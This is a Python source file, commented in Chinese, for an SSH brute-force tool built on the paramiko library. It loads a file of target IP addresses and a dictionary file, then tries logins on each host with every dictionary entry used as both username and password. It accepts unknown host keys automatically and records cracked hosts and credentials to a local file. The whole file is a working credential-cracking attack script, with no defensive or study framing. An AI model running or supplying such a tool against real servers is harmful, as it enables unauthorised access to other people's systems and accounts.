# coding:utf8

import paramiko
import sys
import time


ssh = paramiko.SSHClient()

# 允许连接不在~/.ssh/known_hosts文件中的主机
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("s.txt","w+")
def brute_ssh(hostname, port='22', username_list='', password_list=''):
    # 初始化list
    usernames = load_file(username_list)

    count = 0  # 计数
    print('[*] Cracking start...'+hostname)

    for u in usernames:
        count += 1
        print('[-] trying ' + str(count) + ' data...\tu=' + u + '\tp=' + u)
        try:
            ssh.connect(hostname=hostname, port=port, username=u, password=u)
            print('[!] Cracking success!')
            print('[*] username=>' + u)
            print('[*] password=>' + u)
            f.writelines(hostname+"  "+u+"  "+u+"\n")
            break
        except:
            pass


# 载入字典文件，返回一个一维list
def load_file(file_path):
    ok = 0
    data1=[]
    try:
        data = open(file_path, 'r')
        for item in data:
            data1.append(item.strip("\n"))
        ok = 1
    except:
        data = []
    if not ok:  # 载入字典失败
        print('[!] Load file failed!')
        sys.exit(1)

    print(data1)
    return data1





if __name__ == '__main__':
    port = 22
    username_list = '../ssh_fuce_dict1.txt'
    password_list = '../ssh_fuce_dict1.txt'
    # 开始爆破
    ssh_ips = load_file("../ssh_fuce_ip1.txt")
    for hostname in ssh_ips:
        brute_ssh(hostname=hostname, port=port, username_list=username_list, password_list=password_list)
